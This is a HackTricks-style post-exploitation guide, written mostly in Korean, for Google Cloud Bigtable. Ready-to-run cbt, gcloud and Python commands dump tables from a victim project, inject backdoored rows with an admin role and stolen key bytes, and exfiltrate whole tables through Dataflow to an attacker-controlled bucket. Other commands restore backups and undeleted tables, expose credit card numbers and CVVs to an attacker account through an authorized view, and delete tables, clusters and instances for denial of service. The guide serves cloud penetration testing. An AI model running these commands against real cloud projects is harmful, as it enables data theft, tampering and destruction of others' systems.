# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Bigtable에 대한 자세한 정보는 다음을 확인하세요:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> 아래 명령이 로컬에서 동작하도록 `cbt` CLI를 Cloud SDK를 통해 한 번 설치하세요:
>
> <details>
>
> <summary>cbt CLI 설치</summary>
>
> ```bash
> gcloud components install cbt
> ```
>
> </details>

### 행 읽기

**권한:** `bigtable.tables.readRows`

`cbt`는 Cloud SDK에 포함되어 있으며 중간 미들웨어 없이 admin/data APIs와 통신합니다. compromised project/instance를 가리켜 테이블에서 행을 바로 덤프할 수 있습니다. 잠깐 확인만 하면 스캔 범위를 제한하세요.

<details>

<summary>Bigtable 항목 읽기</summary>
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
</details>

### 행 쓰기

**권한:** `bigtable.tables.mutateRows`, (변경을 확인하려면 `bigtable.tables.readRows`가 필요합니다).

같은 도구로 임의의 셀을 upsert하세요. 이는 설정(configs)에 backdoor를 심거나, web shells를 배치하거나, poisoned dataset rows를 심는 가장 빠른 방법입니다.

<details>

<summary>악성 행 삽입</summary>
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
</details>

`cbt set`은 `@/path` 구문을 통해 raw bytes를 허용하므로, 컴파일된 페이로드나 직렬화된 protobuf를 다운스트림 서비스가 기대하는 형식 그대로 푸시할 수 있습니다.

### 행을 자신의 버킷으로 내보내기

**권한:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

행을 attacker가 제어하는 GCS 버킷으로 스트리밍하는 Dataflow job을 실행하면 전체 테이블의 내용을 exfiltrate할 수 있습니다.

> [!NOTE]
> 내보내기를 수행할 수 있는 충분한 권한을 가진 일부 SA에 대해 `iam.serviceAccounts.actAs` 권한이 필요합니다(기본적으로 별도 지정이 없는 한 default compute SA가 사용됩니다).

<details>

<summary>Bigtable를 GCS 버킷으로 내보내기</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

> [!NOTE]
> Switch the template to `Cloud_Bigtable_to_GCS_Parquet` or `Cloud_Bigtable_to_GCS_SequenceFile` if you want Parquet/SequenceFile outputs instead of JSON. The permissions are the same; only the template path changes.

### 행 가져오기

**권한:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

공격자가 제어하는 버킷에 있는 전체 테이블의 내용을, 행을 스트리밍하는 Dataflow job을 실행하여 당신이 제어하는 GCS 버킷으로 가져올 수 있습니다. 이를 위해 공격자는 먼저 예상되는 스키마에 맞춘 가져올 데이터를 포함한 parquet 파일을 생성해야 합니다. 공격자는 이전 기법을 따라 `Cloud_Bigtable_to_GCS_Parquet` 설정으로 데이터를 parquet 형식으로 먼저 내보내고, 다운로드한 parquet 파일에 새로운 항목을 추가할 수 있습니다.



> [!NOTE]
> 내보내기를 수행할 충분한 권한을 가진 서비스 계정(SA)에 대해 `iam.serviceAccounts.actAs` 권한이 필요합니다(별도 지정이 없는 경우 기본 compute SA가 사용됩니다).

<details>

<summary>GCS 버킷에서 Bigtable로 가져오기</summary>
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

### 백업 복원

**권한:** `bigtable.backups.restore`, `bigtable.tables.create`.

이 권한을 가진 공격자는 자신이 제어하는 새 테이블로 백업을 복원하여 이전의 민감한 데이터를 복구할 수 있습니다.

<details>

<summary>Bigtable 백업 복원</summary>
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
</details>

### 테이블 복구

**권한:** `bigtable.tables.undelete`

Bigtable은 일반적으로 기본값으로 7일인 유예 기간(grace period)을 가진 소프트 삭제를 지원합니다. 이 기간 동안 `bigtable.tables.undelete` 권한을 가진 공격자는 최근에 삭제된 테이블을 복원하고 모든 데이터를 복구하여 파기된 것으로 여겨졌던 민감한 정보에 접근할 수 있습니다.

특히 다음과 같은 상황에서 유용합니다:
- 사건 대응 중 방어자(defenders)가 삭제한 테이블에서 데이터 복구
- 의도적으로 삭제된 과거 데이터에 접근
- 우발적이거나 악의적인 삭제를 되돌려 persistence를 유지

<details>

<summary>Bigtable 테이블 복구</summary>
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
</details>

> [!NOTE]
> undelete 작업은 구성된 보존 기간(기본값 7일) 내에서만 작동합니다. 이 기간이 지나면 테이블과 해당 데이터는 영구적으로 삭제되며 이 방법으로 복구할 수 없습니다.


### 권한 있는 뷰 생성

**Permissions:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Authorized views를 사용하면 테이블의 선별된 하위 집합을 표시할 수 있습니다. 최소 권한(least privilege)을 준수하는 대신, 관심 있는 민감한 열/행 집합을 **정확히** 공개하고 자신의 주체를 화이트리스트에 올리는 데 사용하세요.

> [!WARNING]
> 문제는 권한 있는 뷰를 생성하려면 기본 테이블에서 행을 읽고 변경(mutate)할 수 있어야 하기 때문에 추가 권한을 얻는 것이 아니며, 따라서 이 기법은 대부분 쓸모가 없습니다.

<details>

<summary>권한 있는 뷰 생성</summary>
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
</details>

액세스가 뷰에 한정되기 때문에 수비 측은 방금 새로 생성한 민감도 높은 엔드포인트를 종종 간과합니다.

### 권한 있는 뷰 읽기

**Permissions:** `bigtable.authorizedViews.readRows`

Authorized View에 접근 권한이 있다면, read 요청에서 authorized view 이름을 지정하여 Bigtable client libraries를 사용해 해당 뷰의 데이터를 읽을 수 있습니다. authorized view는 테이블에서 접근할 수 있는 내용을 제한할 가능성이 있다는 점에 유의하세요. 아래는 Python을 사용한 예시입니다:

<details>

<summary>권한 있는 뷰에서 읽기 (Python)</summary>
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
</details>

### Denial of Service via Delete Operations

**권한:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Bigtable의 삭제 권한은 denial of service attacks에 악용될 수 있습니다. 이러한 권한을 가진 공격자는 중요한 Bigtable 리소스를 삭제하여 운영을 중단시킬 수 있습니다:

- **`bigtable.appProfiles.delete`**: 애플리케이션 프로파일을 삭제하여 클라이언트 연결 및 라우팅 구성을 중단시킵니다
- **`bigtable.authorizedViews.delete`**: authorized view를 제거하여 애플리케이션의 정상적인 접근 경로를 차단합니다
- **`bigtable.authorizedViews.deleteTagBinding`**: authorized view에서 태그 바인딩을 제거합니다
- **`bigtable.backups.delete`**: 백업 스냅샷을 파기하여 재해 복구 옵션을 없앱니다
- **`bigtable.clusters.delete`**: 전체 클러스터를 삭제하여 즉시 데이터 사용 불가 상태를 초래합니다
- **`bigtable.instances.delete`**: 전체 Bigtable 인스턴스를 제거하여 모든 테이블과 구성을 삭제합니다
- **`bigtable.tables.delete`**: 개별 테이블을 삭제하여 데이터 손실과 애플리케이션 장애를 일으킵니다

<details>

<summary>Bigtable 리소스 삭제</summary>
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
</details>

> [!WARNING]
> 삭제 작업은 종종 즉시 실행되며 되돌릴 수 없습니다. 이러한 명령을 테스트하기 전에 백업이 존재하는지 확인하세요. 영구적인 데이터 손실 및 심각한 서비스 중단을 초래할 수 있습니다.

{{#include ../../../banners/hacktricks-training.md}}
